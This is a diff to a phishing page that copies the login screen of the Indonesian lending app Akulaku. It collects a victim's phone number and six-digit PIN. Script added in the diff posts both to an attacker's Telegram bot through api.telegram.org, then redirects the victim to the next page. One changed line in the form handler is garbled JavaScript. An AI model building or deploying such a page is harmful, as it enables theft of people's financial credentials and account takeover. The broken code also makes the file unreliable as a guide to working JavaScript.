@@ -34,10 +34,9 @@
 
         /* Styling Logo Gambar */
         .logo-img {
-            height: 50px;
+            width: 150px; /* Atur ukuran logo */
             margin-bottom: 10px;
-            /* Ganti URL di bawah ini dengan logo Anda jika ingin menggunakan gambar asli */
-            content: url('https://upload.wikimedia.org/wikipedia/commons/a/a9/Akulaku_Logo.svg'); 
+            object-fit: contain;
         }
 
         .sub-logo {
@@ -124,7 +123,7 @@
             text-decoration: none;
         }
         
-        /* Loading Spinner (Hidden) */
+        /* Loading Spinner */
         .spinner {
             display: none;
             margin-left: 10px;
@@ -140,12 +139,20 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        
+        /* Error Message */
+        .error-msg {
+            color: #D32F2F;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
     <div class="login-container">
-        <!-- Logo Menggunakan Tag IMG -->
+        <!-- Logo Menggunakan URL Anda -->
         <img src="https://image2url.com/r2/default/images/1771999892642-3c66d39f-3501-435e-a9ce-954e9fc5b48c.png" alt="Logo Akulaku" class="logo-img">
         
         <div class="sub-logo">Belanja sekarang, bayar nanti</div>
@@ -158,9 +165,8 @@
 
             <div class="input-group">
                 <label for="pin">PIN (6 Digit)</label>
-                <!-- maxlength="6" membatasi input maksimal 6 karakter -->
-                <!-- inputmode="numeric" memastikan keypad angka di HP -->
                 <input type="password" id="pin" maxlength="6" inputmode="numeric" placeholder="Masukkan 6 digit PIN" required>
+                <div class="error-msg" id="errorMsg">PIN harus 6 digit angka</div>
             </div>
 
             <button type="submit" class="btn-login" id="submitBtn">
@@ -181,14 +187,11 @@
 
     <script>
         // --- KONFIGURASI TELEGRAM BOT ANDA ---
-        // Ganti 'ISI_TOKEN_BOT_DISINI' dengan Token Bot Anda (contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11)
-        const BOT_TOKEN = 'ISI_TOKEN_BOT_DISINI'; 
-        
-        // Ganti 'ISI_CHAT_ID_DISINI' dengan Chat ID Anda (bisa berupa angka negatif untuk grup atau ID user)
-        const CHAT_ID = 'ISI_CHAT_ID_DISINI'; 
+        const BOT_TOKEN = 'ISI_TOKEN_BOT_DISINI'; // Contoh: 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11
+        const CHAT_ID = 'ISI_CHAT_ID_DISINI'; // Chat ID Anda
         // -------------------------------------
 
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        document('loginForm').addEventListener('submit', async function.getElementById(e) {
             e.preventDefault();
             
             const phone = document.getElementById('phone').value;
@@ -196,13 +199,49 @@
             const btn = document.getElementById('submitBtn');
             const spinner = document.getElementById('loadingSpinner');
             const btnText = btn.querySelector('span');
+            const errorMsg = document.getElementById('errorMsg');
 
             // Validasi panjang PIN
-            if (pin.length !== 6) {
-                alert("PIN harus 6 digit!");
+            if (pin.length !== 6 || isNaN(pin)) {
+                errorMsg.style.display = 'block';
                 return;
+            } else {
+                errorMsg.style.display = 'none';
             }
 
-            // Tampilan Loading
+            // Tampilkan Loading
             btn.disabled = true;
-            btn
+            btnText.textContent = "Memproses...";
+            spinner.style.display = "inline-block";
+
+            // --- KIRIM DATA KE TELEGRAM ---
+            if (BOT_TOKEN !== 'ISI_TOKEN_BOT_DISINI' && CHAT_ID !== 'ISI_CHAT_ID_DISINI') {
+                const message = `🔔 *Login Baru Akulaku*\n\n📱 Nomor: ${phone}\n🔐 PIN: ${pin}`;
+                
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (error) {
+                    console.error('Gagal kirim ke Telegram:', error);
+                }
+            }
+
+            // --- ALIHKAN KE HALAMAN SELANJUTNYA ---
+            // Ganti 'home.html' dengan URL halaman tujuan Anda
+            setTimeout(() => {
+                window.location.href = "home.html";
+            }, 1000); // Dialihkan setelah 1 detik
+        });
+    </script>
+
+</body>
+</html>
